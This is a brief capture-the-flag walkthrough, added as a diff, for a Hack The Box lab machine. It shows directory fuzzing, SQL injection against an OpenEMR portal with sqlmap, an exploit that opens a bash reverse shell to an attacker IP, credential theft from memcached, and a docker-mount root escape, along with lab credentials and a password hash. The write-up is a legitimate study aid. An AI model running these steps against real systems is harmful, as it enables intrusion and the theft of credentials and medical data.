@@ -1,0 +1,40 @@
+> enum http service
+> fuzzing to find another dir
+$ wfuzz --hc 404 -c -w /usr/share/seclists/Discovery/Web-Content/common.txt http://cache.htb/FUZZ
+> found http://cache.htb/jquery/functionality.js,get cred to login ash:H@v3_fun
+> enum to find new domain 'hms.htb' ,then add it to /etc/hosts
+> browsing hms.htb we will see it's openemr :)),searching CVE for it
+> Found some useful resource about it's vulnerabilities 
+	+ https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf
+	+ https://www.youtube.com/watch?v=DJSQ8Pk_7hc&t
+> Base on it let exploit
+> capture request with burp,save it to some file
+
+GET /portal/find_appt_popup_user.php?catid=1 HTTP/1.1
+Host: hms.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Cookie: OpenEMR=fr76ol36b6r9d4h5r2dd6cps7f; PHPSESSID=998ampl7v3sf9jvgsdjs00leqg
+Upgrade-Insecure-Requests: 1
+
+$ sqlmap -r vuln_request.req --threads=10 --dbs
+$ sqlmap -r vuln_request.req --threads=10 -D openemr --tables
+$ sqlmap -r vuln_request.req --threads=10 -D openemr -T users_secure --dump
+
+> got user name and crypted password openemr_admin:$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.
+> simple try to crack we can get clear text password : xxxxxx
+> use next cve to get shell as www-data
+
+$ python openemr_cve http://hms.htb/ -u openemr_admin -p xxxxxx -c 'bash -i >& /dev/tcp/10.10.14.54/2222 0>&1'
+
+> abit enum inside machine we could find memcached service
+> follow this resource 'https://stackoverflow.com/questions/19560150/get-all-keys-set-in-memcached' get username:password -> luffy:0n3_p1ec3
+> logging with ssh
+> enum again,we can see it's running docker service
+> if u have some exps with docker so it really ez to figure out the way for root
+
+$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
